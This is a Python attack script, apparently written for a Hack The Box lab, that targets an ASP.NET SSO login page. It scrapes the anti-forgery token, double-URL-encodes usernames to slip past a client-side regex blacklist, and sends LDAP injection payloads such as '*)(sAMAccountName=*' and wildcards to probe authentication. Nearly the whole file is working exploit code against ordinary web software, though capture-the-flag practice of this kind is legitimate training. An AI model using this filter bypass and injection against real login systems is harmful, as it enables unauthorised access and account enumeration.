#!/usr/bin/env python3
"""
Hercules SSO login tester (HTB). Handles the ASP.NET anti-forgery token +
cookie, and supports double-URL-encoding to bypass the client-side regex
blacklist on the username field.

Usage:
  python3 sso.py probe                 # probe payloads and show distinct responses
  python3 sso.py user <username>       # test a single username
"""
import re
import sys
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://10.129.242.196"
LOGIN = f"{BASE}/Login"
S = requests.Session()
S.verify = False


def dbl_encode(s: str) -> str:
    """Double URL-encode so the app's second decode yields raw LDAP syntax."""
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def get_token():
    r = S.get(LOGIN, timeout=15)
    m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text)
    return m.group(1) if m else None


def login(username: str, password: str = "x", double: bool = True) -> str:
    token = get_token()
    if token is None:
        return "<no token>"
    u = dbl_encode(username) if double else username
    r = S.post(LOGIN, data={
        "Username": u,
        "Password": password,
        "RememberMe": "false",
        "__RequestVerificationToken": token,
    }, timeout=20, allow_redirects=True)
    return f"[{r.status_code}] " + summarize(r.text)


def summarize(html: str) -> str:
    """Pull the meaningful message out of the response page."""
    txt = re.sub(r"<script.*?</script>", " ", html, flags=re.S)
    txt = re.sub(r"<style.*?</style>", " ", txt, flags=re.S)
    txt = re.sub(r"<[^>]+>", " ", txt)
    txt = re.sub(r"\s+", " ", txt).strip()
    # drop the license/boilerplate if present
    return txt[:300]


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"
    if mode == "user":
        print(sys.argv[2], "->", login(sys.argv[2]))
    else:
        payloads = {
            "baseline (admin)": "admin",
            "raw wildcard *": "*",
            "double-enc wildcard": "%252A",
            "double-enc injection *)(sAMAccountName=*": "*)(sAMAccountName=*",
            "python-valid name": "auditor",
        }
        for label, p in payloads.items():
            if p.startswith("%"):  # already encoded
                token = get_token()
                r = S.post(LOGIN, data={"Username": p, "Password": "x",
                                        "RememberMe": "false",
                                        "__RequestVerificationToken": token},
                           timeout=20)
                print(f"{label:45s} [{r.status_code}] {summarize(r.text)[:160]}")
            else:
                print(f"{label:45s} {login(p)[:170]}")
